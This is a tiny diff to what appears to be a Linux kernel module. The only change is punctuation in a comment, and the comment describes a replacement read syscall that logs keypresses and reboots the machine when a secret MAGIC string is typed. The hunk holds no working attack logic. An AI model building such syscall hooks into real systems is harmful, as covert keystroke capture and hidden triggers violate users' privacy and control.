@@ -40,7 +40,7 @@ int pos;    /* Size of MAGIC matched so far */
 
 /* Function that replaces the original read_syscall. In addition to what
    read_syscall does, it also prints keypresses and reboots when the MAGIC
-   command is encountered */
+   command is encountered. */
 asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
